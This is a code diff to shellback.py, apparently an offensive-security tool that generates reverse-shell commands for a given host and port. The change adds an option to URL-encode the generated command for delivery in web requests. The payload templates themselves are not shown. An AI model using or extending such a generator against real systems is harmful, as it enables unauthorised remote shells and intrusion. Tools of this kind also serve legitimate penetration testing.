@@ -1,8 +1,10 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
+import sys
 import socket
 from pyperclip import copy
+from urllib import quote_plus
 from colorama import Fore,Back,Style
 from argparse import ArgumentParser, RawTextHelpFormatter, ArgumentTypeError
 
@@ -27,7 +29,10 @@ def console():
                     help="reverse-shell command to be written in a file", 
                     action='store_true')
     parser.add_argument('-c', "--copy",
-                    help="Copy reverse-shell command to clipboard", 
+                    help="Copy reverse-shell command to clipboard [{0}default {2}{1}False{2}]".format(BT,FR,S), 
+                    action='store_true')
+    parser.add_argument('-u', "--uencode",
+                    help="Urlencode the reverse-shell command [{0}default {2}{1}False{2}]".format(BT,FR,S), 
                     action='store_true')
     args = parser.parse_args()
     return args
@@ -79,11 +84,22 @@ def validateIP(ip):
         raise ArgumentTypeError('{}[x] Invalid ip provided{}'.format(FR,F))
 
 
-def generate(host, port, pl, cp, tofile):
+def urlEncode(cmd):
+    """urlencodes the cmd provided"""
+    try:
+        return quote_plus(cmd)
+    except Exception, error:
+        print '{}[x] Error:{} "{}"'.format(FR,S,error)
+        sys.exit(0)
+
+
+def generate(host, port, pl, cp, tofile, uenc):
     print '{0}[{1}{2}{3}{0}]{3} reverse-shell:\n'.format(BT, FG, pl, S)
     shell = getshell(host, port, pl)
     if tofile:
         shell = ''.join(cmd2file(shell))
+    elif(uenc):
+        shell = urlEncode(shell)
     print shell+'\n'
     if cp:
         copy(shell)
@@ -93,7 +109,7 @@ def generate(host, port, pl, cp, tofile):
 if __name__ == '__main__':
     args = console()
     if args.lhost:
-        generate(args.lhost, args.lport, args.version, args.copy, args.tofile)
+        generate(args.lhost, args.lport, args.version, args.copy, args.tofile, args.uencode)
     else: 
-        print '{}usage:{} shellback.py [-h] [-l] [-p] [-v] [-f] [-c]'.format(BT,S)
+        print '{}usage:{} shellback.py [-h] [-l] [-p] [-v] [-f] [-c] [-u]'.format(BT,S)
 #_EOF
